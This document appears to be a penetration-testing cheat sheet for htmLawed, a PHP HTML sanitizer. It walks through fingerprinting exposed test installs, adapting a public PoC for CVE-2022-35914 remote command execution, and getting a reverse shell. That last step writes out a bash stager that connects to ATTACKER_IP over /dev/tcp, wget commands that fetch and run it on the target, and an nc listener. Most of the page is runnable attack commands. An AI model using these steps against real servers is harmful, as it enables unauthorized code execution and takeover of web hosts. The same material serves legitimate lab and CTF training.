# htmLawed

htmLawed is a PHP library for filtering and sanitizing HTML. Exposed test/demo installs may be vulnerable to command execution.

## Discovery

```bash
nmap -sC -sV TARGET -p 80
# http-title: htmLawed (1.2.5) test
```

Common files:

```text
/index.php
/htmLawed.php
/htmLawed_README.txt
/htmLawed_README.htm
/htmLawed_TESTCASE.txt
```

Fuzz for PHP and documentation files:

```bash
feroxbuster -u http://TARGET -x php,txt,htm,html
```

## CVE-2022-35914

htmLawed 1.2.5 can be vulnerable to command execution. Public PoCs may assume the vulnerable test file lives at:

```text
/vendor/htmlawed/htmlawed/htmLawedTest.php
```

If that 404s but the root page is the htmLawed test interface, patch the PoC target path to `/` or to the discovered PHP file such as `/htmLawed.php`.

```python
# In some PoCs:
uri = "/"
# or
uri = "/htmLawed.php"
```

Run a harmless command first:

```bash
python3 CVE-2022-35914.py -u http://TARGET -c id
```

## Getting a Shell

If one-shot reverse shell payloads do not connect back, use the RCE to fetch and run a stager.

Create the stager:

```bash
cat > rev.sh << 'EOF'
#!/bin/bash
sh -i >& /dev/tcp/ATTACKER_IP/9001 0>&1
EOF
python3 -m http.server 8000
```

Fetch, chmod, and execute through the RCE:

```bash
python3 CVE-2022-35914.py -u http://TARGET -c 'wget -O /tmp/rev.sh http://ATTACKER_IP:8000/rev.sh'
python3 CVE-2022-35914.py -u http://TARGET -c 'chmod +x /tmp/rev.sh'
python3 CVE-2022-35914.py -u http://TARGET -c '/tmp/rev.sh'
```

Start the listener before executing:

```bash
nc -nlvp 9001
```

The shell usually lands as the web server user, e.g. `www-data`.
